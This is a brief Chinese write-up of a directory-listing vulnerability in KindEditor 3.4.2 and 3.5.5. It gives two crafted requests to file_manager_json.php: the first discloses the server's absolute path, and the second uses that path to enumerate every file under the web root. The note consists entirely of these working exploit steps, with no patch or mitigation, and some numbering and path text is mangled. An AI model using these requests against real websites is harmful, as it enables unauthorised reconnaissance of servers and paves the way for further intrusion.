**KindEditor列目录漏洞 **

测试版本：KindEditor 3.4.2  KindEditor 3.5.5 

1.1.http://127.0.0.1/67cms/kindeditor/php/file_manager_json.php?path=/ 
\2. //path=/，爆出绝对路径D:AppServwww67cmskindeditorphpfile_manager_json.php 
\3. 2.http://127.0.0.1/67cms/kindeditor/php/file_manager_json.php?path=AppServ/www/67cms/ 
\4. //根据爆出的绝对路径，修改path的值为AppServ/www/67cms/ 
\5. 这时将遍历d:/AppServ/www/67cms/下的所有文件和文件名 

